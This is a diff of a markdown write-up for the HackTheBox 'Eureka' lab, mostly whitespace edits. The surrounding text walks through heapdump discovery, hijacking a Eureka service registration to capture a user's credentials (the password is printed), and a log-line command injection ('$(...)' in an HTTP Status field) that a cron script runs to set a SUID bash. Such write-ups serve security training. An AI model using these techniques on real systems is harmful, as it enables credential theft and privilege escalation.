@@ -6,7 +6,7 @@ icon: brain-circuit
 
 <figure><img src="../../../../.gitbook/assets/image (450).png" alt=""><figcaption></figcaption></figure>
 
-### &#x20;Attack Flow Explanation
+### Attack Flow Explanation
 
 **Initial Access**
 
@@ -64,8 +64,6 @@ The Nmap scan revealed two HTTP services, with port 80 redirecting to furni.htb.
 The web application hosted on furni.htb is an online furniture store where users can create accounts, log in, and manage shopping carts. The purchase process functions as expected, and no immediate vulnerabilities were observed during initial interaction.
 
 A directory brute-force scan performed with ffuf uncovered several endpoints, including /actuator/heapdump. The Actuator endpoints indicate that the application is running on Spring, which provides production-ready features such as log access, health checks, and various system metrics. The /heapdump endpoint, in particular, exposes a complete memory dump of the application’s heap.
-
-
 
 ### FFUF
 
@@ -155,8 +153,6 @@ eureka:
 
 <figure><img src="../../../../.gitbook/assets/image (454).png" alt=""><figcaption></figcaption></figure>
 
-
-
 * Extracted the JSON configuration data for the **USER-MANAGEMENT-SERVICE** instance.
 * Modified the `hostName` and `ipAddr` fields to point to my own IP address.
 * Sent a `POST` request to the Eureka application endpoint with the modified JSON payload.
@@ -216,14 +212,10 @@ Content-Length: 1480
 }
 ```
 
-
-
 * Set up a listener on port `8081` to capture incoming connections.
 * After some time, received a connection attempt redirected from the manipulated Eureka instance.
 * The request included login credentials for the user **miranda.wise**.
 * Extracted the password: `IL!veT0Be&BeT0L0ve` (observed in URL-encoded form).
-
-
 
 ```bash
 sn0x㉿sn0x)-[~/HTB/Eureka]
@@ -249,14 +241,10 @@ host: 10.10.10.10:8081
 username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=CwCAwUnbSQsa1P749uIEEgsVblUO309_Vn2M8wnxfScg3JJYOTe3833jLWk3sMeeks8wKjlxQ2xtvXxSb0m7xDmXSR5F5KNv
 ```
 
-
-
 * Initially, the captured password did not work with SSH or `su` for the username `miranda.wise`.
 * Checked `/etc/passwd` and discovered that the correct system account name was `miranda-wise`.
 * Retried authentication using the corrected username and the previously captured password.
 * Successfully switched to the `miranda-wise` account and retrieved the first user flag.
-
-
 
 ### Shell as root <a href="#shell-as-root" id="shell-as-root"></a>
 
@@ -302,11 +290,7 @@ done
 --- SNIP ---
 ```
 
-
-
 Reviewing the source code of the `log_analyse.sh` script revealed several checks performed on the provided log file input. One notable function, analyze\_http\_statuses, parses the file line by line, extracts HTTP status codes using a regex, and stores the result in a variable named code. Later in the script, this variable is compared against another within an if statement. This construct introduces the potential for command injection, as under certain conditions the contents of the variable may be evaluated rather than treated as plain text.
-
-
 
 `/opt/log_analyse.sh`
 
@@ -463,8 +447,6 @@ Since some of the logs were generated through interaction with the web applicati
 
 To exploit this, I inserted the line HTTP Status: x\[$(\<COMMAND>)] into the recreated log file. This format satisfies the regex pattern used by the script, which extracts everything after "Status:" into the variable code. When the script later evaluates this variable in an if statement, the command inside the sub-shell is executed. I leveraged this behavior to copy the Bash binary into /tmp and assign it the SUID bit, setting up a path for privilege escalation
 
-
-
 ```bash
 $ cd /var/www/web/cloud-gateway/log/
  
@@ -485,4 +467,4 @@ $ ls -la /tmp/bash
 
 On the next cron execution, the modified log file was processed by the script, triggering the injected command. This allowed me to successfully escalate privileges to root and retrieve the final flag.
 
-<figure><img src="../../../../.gitbook/assets/complete (34).gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
